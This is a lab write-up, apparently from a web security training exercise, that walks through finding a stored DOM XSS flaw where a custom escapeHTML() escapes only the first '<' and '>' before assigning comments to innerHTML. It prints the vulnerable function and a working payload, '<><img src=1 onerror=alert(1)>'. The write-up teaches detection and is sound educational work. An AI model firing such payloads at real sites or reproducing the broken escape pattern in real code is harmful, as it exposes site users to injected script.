
# 🧠 Stored DOM XSS Finding Methodology (Vulnerable Escape Function)

This methodology is derived from a real-world stored DOM XSS lab involving faulty `escapeHTML()` logic and insecure DOM manipulation.

---

## 🧪 Phase 1: Input Discovery
1. Look for inputs like **comment fields** where data gets stored and later displayed.
2. Submit a simple string like:
   ```
   <><>
   ```
3. Observe where the input gets reflected — usually in a `/post?postId=` page.

---

## 🔍 Phase 2: Inspect JavaScript File
4. Check if a suspicious JavaScript file is responsible for rendering comments.
   Example:
   ```html
   <script src="/resources/js/loadCommentsWithVulnerableEscapeHtml.js"></script>
   ```

5. Analyze the code:
   - Look for any custom sanitization functions like:
     ```js
     function escapeHTML(html) {
       return html.replace('<', '&lt;').replace('>', '&gt;');
     }
     ```
   - Notice it's only replacing `<` and `>`, but not full HTML encoding!

---

## 🔥 Phase 3: Check Context & Bypass Escaping
6. Inspect where this `escapeHTML()` function is used:
   - In `setAttribute()` or `innerHTML` calls:
     ```js
     commentBodyPElement.innerHTML = escapeHTML(comment.body);
     ```

7. Test bypasses:
   - Try injecting payloads like:
     ```
     <><u>
     <><img src=1 onerror=alert(1)>
     ```
   - Why it works: The first `<><>` is escaped, but tags after them are **not sanitized**!

---

## 🚀 Final Payload
8. A working XSS payload:
   ```html
   <><img src=1 onerror=alert(1)>
   ```
   - This results in:
     ```html
     <p>&lt;&gt;<img src=1 onerror=alert(1)></p>
     ```
   - The first part gets escaped, but `<img>` executes!

---

## ✅ You Did It! 🎉
- Lab solved using DOM-based **Stored XSS**.
- The vulnerability lies in **incomplete sanitization** and using `innerHTML`.

---

## 💡 Hacker Tips
- Always inspect JS files that render user input.
- Custom-made sanitizers are usually flawed.
- Look for `innerHTML` and `setAttribute()` usage.
- Remember: Escaping a few characters ≠ Proper sanitization.

---

Stay sharp, Rabin 🧠💻 — Keep hacking every day! 🚀
